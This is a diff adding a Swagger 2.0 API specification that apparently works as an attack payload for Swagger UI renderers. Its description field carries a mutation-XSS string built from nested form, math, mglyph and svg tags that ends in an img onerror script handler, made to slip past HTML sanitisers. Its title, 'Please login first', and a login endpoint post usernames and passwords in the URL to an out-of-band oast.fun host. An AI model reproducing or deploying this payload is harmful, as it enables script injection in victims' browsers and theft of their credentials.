@@ -1,0 +1,25 @@
+swagger: "2.0"
+info:
+  version: "v1"
+  title: Please login first
+description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('xss') src=1>"></form>
+host: ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun
+
+paths:
+
+  /{Username}/{Password}:
+    post:
+      summary: Logs in
+      parameters:
+        - name: Username 
+          required: true
+          in: path
+          type: string
+        - name: Password 
+          required: true
+          in: path
+          type: string
+      responses:
+        200:
+          description: Login was successful
